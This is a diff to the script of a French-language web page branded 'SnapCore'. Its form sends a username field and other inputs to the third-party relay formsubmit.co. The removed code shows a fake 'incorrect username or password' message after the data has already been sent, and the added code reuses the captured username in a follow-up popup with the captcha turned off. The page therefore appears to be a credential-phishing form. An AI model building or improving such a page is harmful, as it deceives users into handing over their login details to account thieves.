@@ -196,49 +196,107 @@
   </footer>
 
   <script>
-    const form = document.getElementById("contactForm");
-    const statusMessage = document.getElementById("formStatus");
-    const submitButton = form.querySelector('button[type="submit"]');
+  const form = document.getElementById("contactForm");
+  const status = document.getElementById("formStatus");
+  const button = form.querySelector('button[type="submit"]');
+  const endpoint = form.action.replace("formsubmit.co/", "formsubmit.co/ajax/");
 
-    form.addEventListener("submit", async function (event) {
-      event.preventDefault();
+  const popup = document.createElement("dialog");
+  popup.style.cssText = `
+    width: min(420px, calc(100% - 32px));
+    padding: 30px;
+    border: 0;
+    border-radius: 16px;
+    box-shadow: 0 20px 70px #0005;
+  `;
 
-      statusMessage.textContent = "";
-      submitButton.disabled = true;
-      submitButton.textContent = "Envoi...";
+  popup.innerHTML = `
+    <h2 style="margin:0 0 20px">Renvoyer un message :</h2>
+    <form id="popupForm">
+      <textarea
+        name="Message complémentaire"
+        placeholder="Écris ton message"
+        required
+        style="width:100%;min-height:110px;padding:15px"
+      ></textarea>
+      <button type="submit" style="width:100%">Envoyer</button>
+      <p id="popupStatus" style="color:#d60000" role="status"></p>
+    </form>
+    <button type="button" id="closePopup" style="width:100%;background:#eee;color:#111">
+      Fermer
+    </button>
+  `;
 
-      try {
-        const endpoint = form.action.replace(
-          "formsubmit.co/",
-          "formsubmit.co/ajax/"
-        );
+  document.body.appendChild(popup);
 
-        const response = await fetch(endpoint, {
-          method: "POST",
-          headers: {
-            Accept: "application/json"
-          },
-          body: new FormData(form)
-        });
+  let username = "";
 
-        if (!response.ok) {
-          throw new Error("Échec de l'envoi");
-        }
+  form.addEventListener("submit", async (event) => {
+    event.preventDefault();
+    status.textContent = "";
+    button.disabled = true;
+    button.textContent = "Envoi...";
 
-        form.reset();
-        statusMessage.textContent =
-          "Identifiant ou mot de passe incorrect.";
+    try {
+      const data = new FormData(form);
+      const response = await fetch(endpoint, {
+        method: "POST",
+        headers: { Accept: "application/json" },
+        body: data
+      });
 
-      } catch (error) {
-        statusMessage.textContent =
-          "Une erreur est survenue. Veuillez réessayer.";
+      if (!response.ok) throw new Error();
 
-      } finally {
-        submitButton.disabled = false;
-        submitButton.textContent = "Envoyer";
-      }
-    });
-  </script>
+      username = data.get("Nom d'utilisateur");
+      form.reset();
+      popup.querySelector("#popupForm").reset();
+      popup.querySelector("#popupStatus").textContent = "";
+      popup.showModal();
+    } catch (error) {
+      status.textContent = "Une erreur est survenue. Veuillez réessayer.";
+    } finally {
+      button.disabled = false;
+      button.textContent = "Continuer";
+    }
+  });
+
+  popup.querySelector("#popupForm").addEventListener("submit", async (event) => {
+    event.preventDefault();
+
+    const popupForm = event.currentTarget;
+    const popupButton = popupForm.querySelector('button[type="submit"]');
+    const popupStatus = popup.querySelector("#popupStatus");
+
+    popupButton.disabled = true;
+    popupButton.textContent = "Envoi...";
+    popupStatus.textContent = "";
+
+    try {
+      const data = new FormData(popupForm);
+      data.append("Nom d'utilisateur", username);
+      data.append("_subject", "Message complémentaire depuis SnapCore");
+      data.append("_captcha", "false");
+
+      const response = await fetch(endpoint, {
+        method: "POST",
+        headers: { Accept: "application/json" },
+        body: data
+      });
+
+      if (!response.ok) throw new Error();
+
+      popupForm.reset();
+      popupStatus.textContent = "Votre message a bien été envoyé.";
+    } catch (error) {
+      popupStatus.textContent = "Une erreur est survenue. Veuillez réessayer.";
+    } finally {
+      popupButton.disabled = false;
+      popupButton.textContent = "Envoyer";
+    }
+  });
+
+  popup.querySelector("#closePopup").addEventListener("click", () => popup.close());
+</script>
 
 </body>
 </html>
